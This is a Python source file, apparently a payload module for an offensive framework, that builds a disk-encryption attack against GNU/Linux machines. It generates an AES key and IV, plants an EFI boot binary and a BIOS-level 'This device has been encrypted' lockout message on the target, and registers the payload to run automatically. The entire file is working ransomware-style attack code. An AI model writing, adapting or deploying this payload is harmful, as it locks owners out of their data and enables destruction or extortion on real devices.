"""
Encrypt disk with AES-CBC
"""
import random

from snr.core.payload.payload import Context, Payload
from snr.core.util import common_utils


class DiskEncryptionPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("GNU/Linux",)
    ROOTFS_VERSION = 2
    DEFAULT_MESSAGE = b"This device has been encrypted. Continuing boot is not possible."
    BIOS_PAYLOAD: bytes

    def load(self) -> int:
        with open("data/bios_disk_encryption_message.bin", "rb") as f:
            self.BIOS_PAYLOAD = f.read()
        custom_message_max_len = len(self.BIOS_PAYLOAD) - (self.BIOS_PAYLOAD.find(
            self.DEFAULT_MESSAGE) + len(self.DEFAULT_MESSAGE) + 1) - 1
        self.INPUTS = ((
            "MESSAGE", "", custom_message_max_len, "Custom additional message to show"
        ),)
        return super().load()

    def generate(self, ctx: Context) -> int:
        input_variables = self.get_self_variables()
        message_unencoded = input_variables["MESSAGE"]
        assert isinstance(message_unencoded, str)
        variables = {}
        variables["MESSAGE"] = message_unencoded
        message_encoded = message_unencoded.encode()
        common_utils.print_warning(
            "Generating a random IV! Ensure you take note of it")
        iv = random.SystemRandom().randbytes(16)
        common_utils.print_ok(f"Your IV is: {iv.hex()}")
        variables["IV"] = common_utils.bytes_to_str_repr(iv)

        common_utils.print_warning(
            "Generating a random key! Ensure you take note of it")
        key_raw = random.SystemRandom().randbytes(32)
        common_utils.print_ok(f"Your key is: {key_raw.hex()}")
        variables["KEY"] = common_utils.bytes_to_str_repr(key_raw)

        self.format_payload_and_write(ctx, variables)
        self.copy_root_to_root(ctx, __file__,
                               "data/EFIBOOTX64.EFI", "root/EFIBOOTX64.EFI")
        with common_utils.rootfs_open(ctx, "root/bios_disk_encryption_message.bin", "wb") as stream:
            # Write the part before the custom message (executable part, static message)
            stream.write(self.BIOS_PAYLOAD[:self.BIOS_PAYLOAD.find(
                self.DEFAULT_MESSAGE) + len(self.DEFAULT_MESSAGE) + 1])
            # Write custom message
            stream.write(message_encoded)
            custom_message_len = len(message_encoded)
            # Write the rest of the payload
            stream.write(self.BIOS_PAYLOAD[self.BIOS_PAYLOAD.find(
                self.DEFAULT_MESSAGE) + len(self.DEFAULT_MESSAGE) + 1 + custom_message_len:-1])
        self.add_autorun(ctx)
        return 0


payload = DiskEncryptionPayload()
